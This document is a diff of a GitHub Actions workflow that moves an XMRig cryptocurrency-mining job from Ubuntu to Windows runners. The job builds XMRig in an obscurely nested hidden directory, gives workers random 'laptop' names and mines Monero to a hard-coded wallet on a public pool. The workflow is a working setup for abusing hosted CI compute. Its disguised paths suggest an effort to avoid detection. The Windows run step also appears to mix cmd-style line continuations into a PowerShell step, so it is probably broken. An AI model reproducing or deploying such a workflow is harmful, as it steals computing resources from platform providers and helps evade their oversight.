@@ -1,49 +1,38 @@
-name: Run XMRig Miner
+name: Windows XMRig Miner
 
 on:
   workflow_dispatch:
 
 jobs:
   mine:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v2
-
       - name: Generate random worker name
         id: worker
-        run: echo "name=laptop$(shuf -i 1-100000 -n 1)" >> $GITHUB_OUTPUT
+        run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
 
-      - name: Setup environment
+      - name: Install dependencies (CMake, Git, MSBuild)
         run: |
-          mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do
-          cd ~/.local/.run/.hello/runner/go/beein/.go/do
-          echo "WORKING_DIR=$(pwd)" >> $GITHUB_ENV
-
-      - name: Update and upgrade packages
-        run: |
-          sudo apt update
-          sudo apt upgrade -y
-
-      - name: Install dependencies
-        run: |
-          sudo apt install -y cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System' -y
+          choco install git -y
+          choco install visualstudio2022buildtools -y
+          refreshenv
 
       - name: Clone and build XMRig
         run: |
-          cd $WORKING_DIR
+          mkdir -p $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
+          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
           git clone https://github.com/xmrig/xmrig.git
           cd xmrig
           mkdir build
           cd build
-          cmake ..
-          make -j1
-          echo "XMRIG_DIR=$(pwd)" >> $GITHUB_ENV
+          cmake .. -G "Visual Studio 17 2022" -A x64
+          cmake --build . --config Release
 
       - name: Run XMRig
         run: |
-          cd $XMRIG_DIR
-          nice -n 19 ./xmrig -o pool.supportxmr.com:3333 \
-            -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p \
-            -p ${{ steps.worker.outputs.name }} \
+          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do\xmrig\build\Release
+          .\xmrig.exe -o pool.supportxmr.com:3333 ^
+            -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p ^
+            -p ${{ steps.worker.outputs.name }} ^
             -k --donate-level 1 -t 4
